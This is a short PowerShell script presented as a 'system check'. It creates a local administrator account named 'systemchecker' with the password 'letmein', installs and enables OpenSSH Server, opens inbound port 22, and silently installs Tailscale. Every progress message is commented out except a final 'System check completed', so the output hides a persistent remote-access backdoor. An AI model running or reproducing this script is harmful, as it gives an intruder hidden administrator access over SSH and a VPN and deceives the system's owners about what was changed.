$Username = "systemchecker"
$Password = ConvertTo-SecureString "letmein" -AsPlainText -Force

# Create new local user
New-LocalUser -Name $Username -Password $Password -FullName "SSH User" -Description "User for SSH Access"

# Add user to Administrators group (optional) - Remove if standard user is preferred
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Check if OpenSSH Server is installed
$sshCapability = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
if ($sshCapability.State -ne "Installed") {
    #Write-Output "Installing OpenSSH Server..."
    Add-WindowsCapability -Online -Name $sshCapability.Name
}

# Start and enable SSH service
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic

# Allow SSH through Windows Firewall (check if it exists first)
if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "OpenSSH Server (TCP-In)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
}

# Write-Output "User $Username created, SSH enabled, and user allowed to connect."

# -------------------------------
# Download and Install Tailscale
# -------------------------------
$TailscaleURL = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
$InstallerPath = "$env:TEMP\tailscale-setup.exe"

# Write-Output "Downloading Tailscale..."
Invoke-WebRequest -Uri $TailscaleURL -OutFile $InstallerPath

# Write-Output "Installing Tailscale..."
Start-Process -FilePath $InstallerPath -ArgumentList "/quiet" -Wait

#Write-Output "Tailscale installed successfully!"

Write-Output "System check completed"